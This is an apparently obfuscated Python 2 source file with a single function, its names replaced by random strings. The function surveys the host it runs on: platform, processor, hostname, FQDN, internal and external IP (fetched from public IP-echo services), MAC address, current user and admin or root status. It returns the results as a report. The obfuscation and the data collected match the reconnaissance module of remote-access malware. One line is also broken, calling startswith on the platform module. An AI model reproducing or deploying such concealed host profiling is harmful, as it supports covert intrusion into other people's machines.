# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv(plat_type):
    qzJNSkSLfUeWqKBHqpLmzmfEMcCvAaPd = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    ETNCUNIGUjIalLBUhujPLpRyQLeCWlnW = getpass.getuser()
    soJjjIqczmKOvESGAWGZjvcRfnXqsQSD    = socket.gethostname()
    KsAfHQHjaKhZFQzJniEbnQUqHwcGyXfQ        = socket.getfqdn()
    nLbAeQlSbZHGzzfBQuwGCXHaROxgvpYx = socket.gethostbyname(soJjjIqczmKOvESGAWGZjvcRfnXqsQSD)
    EELbLCdABoRoPNnDynApEvWIHrZfXafh     = uuid.getnode()
    GqekErLaizvNJiVrKOCNmMKDFRQmcixk         = ':'.join(("%012X" % EELbLCdABoRoPNnDynApEvWIHrZfXafh)[JYxOQoHxrWVlWZGFRgpIWcoGVeKxUiXr:JYxOQoHxrWVlWZGFRgpIWcoGVeKxUiXr+2] for JYxOQoHxrWVlWZGFRgpIWcoGVeKxUiXr in range(0, 12, 2))
    VWGbawQBgIMdIrFShFNfhxwlfhnqVNyw = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    kChJSwmlKJhUGEMMfuRyAcEJjXGbkZjw = ''
    for wZeKliJjXRYRdozBSSjHLXwmnkJyCXmR in VWGbawQBgIMdIrFShFNfhxwlfhnqVNyw:
        try:
            kChJSwmlKJhUGEMMfuRyAcEJjXGbkZjw = urllib.urlopen('http://'+wZeKliJjXRYRdozBSSjHLXwmnkJyCXmR).read().rstrip()
        except IOError:
            pass
        if kChJSwmlKJhUGEMMfuRyAcEJjXGbkZjw and (6 < len(kChJSwmlKJhUGEMMfuRyAcEJjXGbkZjw) < 16):
            break
    ZUOMyKrZcRNlTnuttdGXYSJvEvDlxMDj = False
    if plat_type.startswith('win'):
        ZUOMyKrZcRNlTnuttdGXYSJvEvDlxMDj = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        ZUOMyKrZcRNlTnuttdGXYSJvEvDlxMDj = os.getuid() == 0
    veDmIKhwRrDvzfFZUqxasZyVCIKNCZAd = 'Yes' if ZUOMyKrZcRNlTnuttdGXYSJvEvDlxMDj else 'No'
    TgcvYrJVgOmVrqHKMwCcAtwzVkaBwGTb = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(qzJNSkSLfUeWqKBHqpLmzmfEMcCvAaPd, processor, architecture,
    soJjjIqczmKOvESGAWGZjvcRfnXqsQSD, KsAfHQHjaKhZFQzJniEbnQUqHwcGyXfQ, nLbAeQlSbZHGzzfBQuwGCXHaROxgvpYx, kChJSwmlKJhUGEMMfuRyAcEJjXGbkZjw, GqekErLaizvNJiVrKOCNmMKDFRQmcixk, ETNCUNIGUjIalLBUhujPLpRyQLeCWlnW, veDmIKhwRrDvzfFZUqxasZyVCIKNCZAd)
    return TgcvYrJVgOmVrqHKMwCcAtwzVkaBwGTb
